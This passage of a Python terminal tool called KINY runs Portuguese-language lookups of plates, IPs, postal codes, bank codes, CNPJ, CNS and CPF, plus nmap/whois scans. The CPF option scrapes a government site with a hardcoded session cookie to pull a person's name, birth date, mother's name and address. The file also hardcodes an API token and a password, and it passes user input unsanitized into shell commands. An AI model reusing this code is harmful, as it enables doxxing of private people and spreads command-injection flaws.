                    print(f"Marca: {B}{placa_data['marca']}{C}")
                    print(f"Roubo/furto: {B}{placa_data['dataAtualizacaoRouboFurto']}{C}")
                    print(f"Situação: {B}{placa_data['situacao']}{C}")
                    print(f"Placa: {B}{placa_data['placa']}{C}")
                    print(f"Chassi: {B}{placa_data['chassi']}{C}")
                    print(f"UF: {B}{placa_data['uf']}{C}")
                    print(f"Município: {B}{placa_data['municipio']}{C}")
                    print(f"Modificada em: {B}{placa_data['dataAtualizacaoCaracteristicasVeiculo']}{C}")
                    print(f"Alarme atualizado: {B}{placa_data['dataAtualizacaoAlarme']}{C}")
                    print(f"Mensagem de retorno: {B}{placa_data['mensagemRetorno']}{C}")
                    print(f"Código de retorno: {B}{placa_data['codigoRetorno']}{C}")
                else:
                    print(f'{C}[{R}i]{C} Sem dados sobre.')
            except:
                print(f'{C}[{R}i{C}] Placa invalida')
                time.sleep(3)
                consultaplaca()
            del placa_data
            del req
            del placa_input
            print(f'{C}[{G}i{C}] Deseja realizar uma nova consulta?')
            print('1.Sim')
            print('2.Não')
            choice = input("===>")
            if choice == "1" or choice == "01":
                consultaplaca()
            if choice == "2" or choice == "02":
                menu()
            else:
                print("Opcao invalida.")
        consultaplaca()
    if op == '7' or op == '07':
        def consultarcns():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            global requests
            global cns_input
            import requests, os, time, base64, json, re
            from requests import get
            requests = requests.get('http://geradorapp.com/api/v1/cns/validate/{}?token=f01e0024a26baef3cc53a2ac208dd141'.format(cns_input))
            cns_data = requests.json()
            if (cns_data['status']) == "1":
                print('Numero: {}'.format(cns_data["data"]["number"]))
                print('Mensagem: {}'.format(cns_data["data"]["message"]))
            else:
                print(f'{C}[{R}*{C}]'+'{}: CNS INVALIDO.'.format(cns_input))
                if gen == '1':
                    print(f'{C}[{Y}i{C}]Tentando novamente...')
                    del cns_data
                    time.sleep(4)
                    gerarcns()
            #print(f'{C}[{R}*{C}]Erro no servidor')
            del requests
            del cns_input
            print("\nDESEJA REALIZAR UMA NOVA CONSULTA? \n{1}Sim\n{2}Nao\n")

            lo = input('===> ')
            if lo == '1' or lo == '01':
                tipocns()
            else:
                menu()
        def gerarcns():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            global requests
            global cns_input
            import requests, os, time, base64, json, re
            from requests import get
            os.system("clear")
            os.system("figlet KINY")
            print(f'{C}[{G}*{C}] Gerando CNS...')
            time.sleep(1)
            cns=requests.request('GET','http://geradorapp.com/api/v1/cns/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cns2=cns['data']['number_formatted']
            cns=cns['data']['number']
            print(f'{C}[{Y}i{C}] O CNS gerado foi: {B}'+cns2)
            time.sleep(1)
            print(f'{C}[{G}*{C}] Consultando CNS gerado...')
            cns_input = cns
            consultarcns()
        def tipocns():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            print(f'''
{C}[{G}i{C}]Formas de operação
[{G}1{C}]Gerar CNS
[{G}2{C}]Consultar CNS
''')
            lou = input('===> ')
            if lou == "1" or lou == "01":
                global gen
                gen = 1
                gerarcns()
            if lou == "2" or lou == "02":
                global cns_input
                cns_input = input(f'{C}[{G}*{C}]Informe o CNS:')
                consultarcns()
            else:
                print('Opção Inválida')
        tipocns()
    if op == '6' or op == '06':
        def gerarcpf():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            print(f'{C}[{G}i{C}] Gerando CPF...')
            time.sleep(1)
            cpf=requests.request('GET','http://geradorapp.com/api/v1/cpf/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cpf2=cpf['data']['number_formatted']
            cpf=cpf['data']['number']
            print(f'{C}[{Y}i{C}] O CPF gerado foi: {B}'+cpf2)
            time.sleep(1)
            print(f'{C}[{G}i{C}] Consultando CPF gerado...')
            consulta(cpf)

        def consulta(cpf):
            import requests
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            try:
                h={
                'Content-Type': "text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1",
                'Cookie': "ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID;                       FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78",
    'Host': "www.juventudeweb.mte.gov.br"
                }
                r=requests.post(a, headers=h, data=f'acao=consultar%20cpf&cpf={cpf}&nocache=0.7636039437638835').text
                print(f'''
{C}CPF: {B}{re.search('NRCPF="(.*?)"', r).group(1)}
{C}Nome: {B}{re.search('NOPESSOAFISICA="(.*?)"', r).group(1).title()}
{C}Nascimento: {B}{re.search('DTNASCIMENTO="(.*?)"', r).group(1)}
{C}Nome da Mae: {B}{re.search('NOMAE="(.*?)"', r).group(1).title()}
{C}Endereco: {B}{re.search('NOLOGRADOURO="(.*?)"', r).group(1).title()}, {re.search('NRLOGRADOURO="(.*?)"', r).group(1)}
{C}Complemento: {B}{re.search('DSCOMPLEMENTO="(.*?)"', r).group(1).title()}
{C}Bairro: {B}{re.search('NOBAIRRO="(.*?)"', r).group(1).title()}
{C}Cidade: {B}{re.search('NOMUNICIPIO="(.*?)"', r).group(1).title()}-{re.search('SGUF="(.*?)"', r).group(1)}
{C}CEP: {B}{re.search('NRCEP="(.*?)"', r).group(1)}
              ''')
                print(f'{C}[{Y}i{C}] Deseja realizar uma nova consulta?')
                print('1.Sim')
                print('2.Não')
                nova=input(f'===>').lower()
                if nova=='1' or nova=='01':
                    tipos()
                if nova=='2' or nova=='02':
                    menu()
                else:
                    print(f'{C}[{R}i{C}]Opção inválida')
                    menu()
            except(AttributeError):
                print(f'{R}CPF Gerado nao existe{C}')
                print(f'{R}Pressione enter para retornar{C}')
                lo = input("===>")
                tipos()
        def tipos():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            clear()
            os.system('figlet KINY')
            print(f"""
{C}[{G}i{C}] Formas de operação:
    1.Consultar CPF
    2.Gerar CPF e consultar
    3.Voltar
{C}[{Y}i{C}] Selecione a forma de operação.
""")
            tool=input(f'===>')
            if tool=='1' or tool == '01':
                cpf=input(f'{C}[{Y}i{C}] Informe o CPF a ser consultado (sem pontos ou traços): {B}')
                clear()
                consulta(cpf)
            elif tool=='2' or tool == '02':
                gerarcpf()
            elif tool=='3' or tool == '03':
                menu()
            else:
                print(f'{C}[{R}-{C}] Seleção inválida.')
                time.sleep(1)
                tipos()
        tipos()


    if op == '5' or op == '05':
        def bank():
            global requests
            import requests, os, time, base64, json, re
            from requests import get
            clear()
            os.system("figlet KINY")
            print("DIGITE O CODIGO BANCARIO")
            bank_input = input("\033[32m=====> \033[m")
            try:
                requests = requests.get('https://brasilapi.com.br/api/banks/v1/{}'.format(bank_input))

                bank_data = requests.json()

                if 'message' not in bank_data:
            	    clear()
            	    os.system("figlet KINY")
            	    print("Código bancário: {}".format(bank_data['code']))
            	    print("Nome: {}".format(bank_data['name']))
            	    print("Nome completo: {}".format(bank_data['fullName']))
            	    print("ISPB: {}".format(bank_data['ispb']))

                else:
                    clear()
                    print('{}: Código bancário inválido.'.format(bank_input))
            except:
                 print(f'{C}[{R}*{C}]Erro no servidor')
            print("\nDESEJA CONSULTAR UM NOVO CODIGO BANCARIO? \n{1}Sim\n{2}Nao\n")
            del requests
            kc = input("===> ")

            if kc == '01' or kc == '1':
            	bank()
            else:
                clear()
                menu()
        bank()
    if op == '1' or op == '01':
        def main():
            from requests import get
            clear()
            print("\033[32m######\033[m")
            print("\033[32m#KINY#\033[m")
            print("\033[32m######\033[m")

            cep_input = input("DIGITE O CEP: ")

            if len(cep_input) != 8:
                print("\033[1;31mQUANTIDADE DE DIGITOS INVALIDA\033[m")
                main()

            request = get('https://viacep.com.br/ws/{}/json/'.format(cep_input))

            adress_data = request.json()

            if 'erro' not in adress_data:
                os.system("clear")
                print("\033[1;31m^CEP ENCONTRADO^\033[m")
                print()
                print('Cep: {}'.format(adress_data['cep']))
                print('Logradouro: {}'.format(adress_data['logradouro']))
                print('Complemento: {}'.format(adress_data['complemento']))
                print('Bairro: {}'.format(adress_data['bairro']))
                print('Cidade: {}'.format(adress_data["localidade"]))
                print('Estado: {}'.format(adress_data['uf']))
                print('IBGE: {}'.format(adress_data['ibge']))
                print('GIA: {}'.format(adress_data['gia']))
                print('SIAFI: {}'.format(adress_data['siafi']))
                print('DDD: {}'.format(adress_data['ddd']))

            else:
                print('{}: CEP INVALIDO.'.format(cep_input))

            print("DESEJA REALIZAR UMA NOVA CONSULTA? \n1. Yes\n2. No\n")
            option = input('===> ')

            if option == '1':
                main()
            else:
                menu()

        main()

    if op == '00' or op == '0':
        os.system("clear")
        print("\033[32m Arrivederci\033[m")
        exit()

    if op == '99' or op == '99':
        os.system("clear")
        os.system("pkg update && pkg update")
        menu()

    if op == '3' or op == '03':
        os.system("clear")
        os.system("pkg install nmap")
        os.system("pkg install whois")
        os.system("pkg install python")
        os.system("clear")
        print("\033[1;36m KINY \033[m")
        print()
        j = input("1 for HTTPS, 2 for HTTP:")
        print()
        print("^^^^^^^^^^^^^^^^*")
        print()
        print("ex: site.com")
        print()
        k = input("Domain: ")
        print()
        print("^^^^^^^^^^^^^^^^^*")
        print()
        if j == '1':
            print("URL: ""https://www." + k)
            os.system("nmap " + k)
            os.system("whois " + k)
        print()
        if j == '2':
            print("URL: ""http://www." + k)
            os.system("nmap " + k)
            os.system("whois " + k)
        print ("Pressione enter para voltar.")
        pause = input("====>")
        menu()

    if op == '2' or op == '02':
        def ip():
            from requests import get
            os.system("clear")
            print("\033[32m######\033[m")
            print("\033[32m#KINY#\033[m")
            print("\033[32m######\033[m")

            ip_input = input("\033[32m=====> \033[m")

            requests = get('http://ip-api.com/json/{}'.format(ip_input))

            adress_data = requests.json()

            if (adress_data['status']) == 'success':
                print('IP: {}'.format(adress_data['query']))
                print('Status: {}'.format(adress_data['status']))
                print('Pais: {}'.format(adress_data['country']))
                print('Regiao: {}'.format(adress_data['regionName']))
                print('Cidade: {}'.format(adress_data['city']))
                print('ZIP: {}'.format(adress_data['zip']))
                print('Latitude: {}'.format(adress_data['lat']))
                print('Longitude: {}'.format(adress_data['lon']))
                print('Fuso-Horarro: {}'.format(adress_data['timezone']))
                print('Internet-Info: {}'.format(adress_data['as']))
                print('ISP: {}'.format(adress_data['isp']))
                print('ORG: {}'.format(adress_data['org']))

            else:
                print('{}: IP INVALIDO.'.format(ip_input))

            print("\nDESEJA LOCALIZAR UM NOVO IP? \n{1}Sim\n{2}Nao\n")

            vi = input('===> ')

            if vi == '1' or vi == '01':
                ip()
            else:
                menu()

        ip()
    if op == '4' or op == '04':
        def geradorcnpj():
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            import requests, os, time, base64, json, re
            from requests import get
            os.system("clear")
            os.system("figlet KINY")
            print(f'{C}[{G}*{C}] Gerando CNPJ...')
            time.sleep(1)
            cnpj=requests.request('GET','http://geradorapp.com/api/v1/cnpj/generate?token=f01e0024a26baef3cc53a2ac208dd141').json()
            cnpj2=cnpj['data']['number_formatted']
            cnpj=cnpj['data']['number']
            print(f'{C}[{Y}i{C}] O CNPJ gerado foi: {B}'+cnpj2)
            time.sleep(1)
            print(f'{C}[{G}*{C}] Consultando CNPJ gerado...')
            global cnpj_input
            cnpj_input = cnpj
            consultacnpj()
        def consultacnpj():
            global requests
            global cnpj_input
            R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
            import requests, os, time, base64, json, re
            from requests import get
            try:
                requests = requests.get('https://www.receitaws.com.br/v1/cnpj/{}'.format(cnpj_input))
                cnpj_data = requests.json()
            except:
                print(f'{C}[{R}*{C}]Erro no servidor')
                cnpj_data = "message"
            if 'message' not in cnpj_data:
                print("CNPJ: {}".format(cnpj_data['cnpj']))
                print("Atividade principal: {}".format(cnpj_data['atividade_principal'][0]['text']))
                print("Nome: {}".format(cnpj_data['nome']))
                print("CEP: {}".format(cnpj_data['cep']))
                try:
                    print("Telefone: {}".format(cnpj_data['telefone']))
                except:
                    pass
                try:
                    print("Email: {}".format(cnpj_data['email']))
                except:
                    pass
                print("Situação: {}".format(cnpj_data['situacao']))
                print("UF: {}".format(cnpj_data['uf']))
                print("Municipio: {}".format(cnpj_data['municipio']))
                print("Logradouro: {}".format(cnpj_data['logradouro']))
                print("Numero: {}".format(cnpj_data['numero']))
                print("Complemento: {}".format(cnpj_data['complemento']))
                print("Porte: {}".format(cnpj_data['porte']))
                print("Natureza: {}".format(cnpj_data['natureza_juridica']))
                print("Data de abertura: {}".format(cnpj_data['abertura']))
                print("Tipo: {}".format(cnpj_data['tipo']))
                print("Capital: {}".format(cnpj_data['capital_social']))
                try:
                    print("===============================")
                    print("pessoal: {}".format(cnpj_data['qsa'][0]['nome']))
                    print("Cargo: {}".format(cnpj_data['qsa'][0]['qual']))
                except:
                    pass
                try:
                    print("pessoal: {}".format(cnpj_data['qsa'][1]['nome']))
                    print("Cargo: {}".format(cnpj_data['qsa'][1]['qual']))
                except:
                    pass
                try:
                    print("Pessoal: {}".format(cnpj_data['qsa'][2]['nome']))
                    print("Cargo: {}".format(cnpj_data['qsa'][2]['qual']))
                except:
                    pass
            else:
                print(f'{C}[{R}*{C}]'+'{}: CNPJ INVALIDO.'.format(cnpj_input))
                if gen == '1':
                    print(f'{C}[{Y}i{C}]Tentando novamente...')
                    del cnpj_data
                    del requests
                    del cnpj_input
                    time.sleep(4)
                    geradorcnpj()
            del requests
            del cnpj_input
            print("\nDESEJA REALIZAR UMA NOVA CONSULTA? \n{1}Sim\n{2}Nao\n")

            lo = input('===> ')
            if lo == '1' or lo == '01':
                tipo()
            else:
                menu()
        def tipo():
            clear()
            os.system('figlet KINY')
            print('''
O QUE DESEJA FAZER?
{1}GERAR CNPJ
{2}CONSULTAR CNPJ
            ''')
            kct = input("===> ")
            if kct == '1' or kct == '01':
                global gen
                gen = "1"
                geradorcnpj()
            if kct == '2' or kct == '02':
                clear()
                print("\033[32m######\033[m")
                print("\033[32m#KINY#\033[m")
                print("\033[32m######\033[m")
                print("DIGITE O CNPJ SEM / . OU -")
                global cnpj_input
                cnpj_input = input("\033[32m=====> \033[m")
                consultacnpj()
            else:
                print('Opção inválida')
                tipo()
        tipo()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def quit():
        os.system("clear")
        print("\033[32m Arrivederci\033[m")
        timeout(1)

def password():
    clear()
    global user
    user = input("USERNAME:  ")
    snh = 'VirtualInsanity'
    print("\n ")
    if user == 'Kiny' or user == 'KINY':
        kinymode()
    if input("PASSWORD:  ").strip() == snh:
        menu()
    else:
        os.system("clear")
        print("\033[1;31mERROR: Wrong Password....Yare Yare\033[m")
        timeout(1)
if __name__ == '__main__':
    print(f'{G} Checando por atualizacoes... {C}')

    update = subprocess.check_output('git pull', shell=True)

    if 'Already up to date' not in update.decode():
        print(f'{G}Atualizacao instalada!\nReiciando app...{C}')
        time.sleep(5)
        subprocess.run('clear')
        restart()
    else:
        print('Nenhuma atualizacao disponivel.')
        time.sleep(2)
        password()
